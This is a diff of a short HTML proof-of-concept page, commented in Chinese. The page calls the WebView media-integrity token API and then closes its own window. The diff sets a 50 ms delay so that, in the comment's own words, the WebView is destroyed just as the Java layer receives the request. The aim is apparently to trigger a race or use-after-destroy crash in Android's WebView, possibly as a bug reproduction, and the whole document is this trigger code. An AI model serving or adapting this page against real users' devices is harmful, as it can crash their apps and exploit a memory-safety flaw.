@@ -2,30 +2,24 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>正在触发测试...</title>
+    <title>正在触发压测...</title>
 </head>
-<body>
-    <h3 style="text-align: center; margin-top: 50px;">正在请求接口并尝试销毁网页，请稍候...</h3>
+<body style="background: #000; color: #fff; text-align: center; padding-top: 50px;">
+    <h3>正在向底层发送高危请求并强行关闭...</h3>
 
     <script>
         window.onload = function() {
-            // 1. 尝试调用媒体完整性 API（异步启动 Java 层的服务逻辑）
-            if (window.navigator && window.navigator.getWebViewMediaIntegrityTokenProvider) {
+            if (navigator.getWebViewMediaIntegrityTokenProvider) {
                 try {
-                    window.navigator.getWebViewMediaIntegrityTokenProvider({ cloudProjectNumber: 12345678 });
-                    console.log("API 已调用");
-                } catch(e) {
-                    console.error("调用失败", e);
-                }
-            } else {
-                console.log("当前浏览器不支持该 API，可能无法完整复现");
+                    // 1. 成功向 Java 层投递异步请求
+                    navigator.getWebViewMediaIntegrityTokenProvider({ cloudProjectNumber: 12345678 });
+                } catch(e) {}
             }
 
-            // 2. 关键：不留任何喘息时间，零延迟立刻命令内置浏览器关闭当前网页
-            // 内置浏览器收到这个指令后，底层对应的 WebView 实例会被销毁（Destroy）
+            // 2. 延迟 50 毫秒再自杀，确保 Java 层收到请求的一瞬间 WebView 刚好被销毁
             setTimeout(function() {
                 window.close();
-            }, 0); 
+            }, 50); 
         };
     </script>
 </body>
